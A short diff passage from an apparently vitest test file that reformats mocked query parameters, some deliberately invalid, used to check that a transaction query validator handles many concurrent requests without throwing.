-							limit: i % 5 === 0 ? "invalid" : "10",
-						})),
-					},
+						query: vi.fn(() => ({
+							fromAddress: i % 3 === 0 ? 'invalid' : '0x1234567890abcdef1234567890abcdef12345678',
+							limit: i % 5 === 0 ? 'invalid' : '10'
+						}))
+					}
 				};
 
-				promises.push(
-					validateTransactionQueryParams(context, mockNext)
-				);
+				promises.push(validateTransactionQueryParams(context, mockNext));
 			}
 
 			// All requests should complete without throwing
